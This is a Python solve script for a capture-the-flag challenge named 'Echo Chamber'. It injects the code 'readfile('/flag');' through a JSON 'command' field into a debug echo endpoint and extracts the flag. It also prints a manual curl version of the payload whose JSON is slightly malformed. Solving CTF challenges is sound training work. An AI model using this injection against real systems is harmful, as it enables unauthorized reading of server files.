#!/usr/bin/env python3
"""
Echo Chamber - Simplified Exploit
Author: Shadow PB

This script exploits the debug echo test mode for easy command execution.
"""

import requests
import json

def simple_exploit(target_url="http://ctf.dscjssstuniv.in"):
    """
    Simple exploit using the echo test mode
    """
    
    print(f"[*] Target: {target_url}")
    print("[*] Using simplified echo test mode approach...")
    
    # Craft the malicious JSON payload
    payload = {
        "signal": "Echo",
        "command": "readfile('/flag');"
    }
    
    json_payload = json.dumps(payload)
    print(f"[*] Payload: {json_payload}")
    
    try:
        # Use the echo test mode
        url = f"{target_url}/?test=echo"
        
        response = requests.post(
            url,
            data=json_payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response content:")
        print("-" * 50)
        print(response.text)
        print("-" * 50)
        
        # Check if we got the flag
        if 'DSCCTF{' in response.text:
            flag_start = response.text.find('DSCCTF{')
            flag_end = response.text.find('}', flag_start) + 1
            flag = response.text[flag_start:flag_end]
            print(f"[+] SUCCESS! Flag found: {flag}")
            return True
        else:
            print("[-] No flag found in response")
            return False
            
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        return False

def advanced_tcp_exploit(target_url="http://ctf.dscjssstuniv.in"):
    """
    Advanced exploit using TCP self-connect (for educational purposes)
    """
    print("\n[*] Advanced TCP Self-Connect approach (optional):")
    print("[*] This requires setting up an echo server and is more complex.")
    print("[*] The simple echo test mode is the intended solution path.")
    
    # This would be the more complex approach - left as an exercise
    return False

def main():
    print("=" * 60)
    print("Echo Chamber - Simplified Exploit")
    print("Author: Shadow PB")
    print("=" * 60)
    print()
    print("This challenge has two vulnerability paths:")
    print("1. Simple: Debug echo test mode (MEDIUM difficulty)")
    print("2. Advanced: TCP self-connect vulnerability (HARD difficulty)")
    print()
    print("Attempting the simple approach first...")
    print()
    
    # Try the simple approach first
    success = simple_exploit()
    
    if not success:
        print("\n[!] Simple exploit failed. Troubleshooting:")
        print("    1. Ensure the Docker container is running on port 8070")
        print("    2. Check network connectivity")
        print("    3. Verify the application is responding")
        
        # Show manual command for reference
        print("\n[*] Manual exploitation command:")
        print("curl 'http://ctf.dscjssstuniv.in/?test=echo' -X POST -H 'Content-Type: application/json' -d '{\"signal\":\"Echo\",\"command\":\"readfile(\\\"/flag\\\");\"}}'")

if __name__ == "__main__":
    main()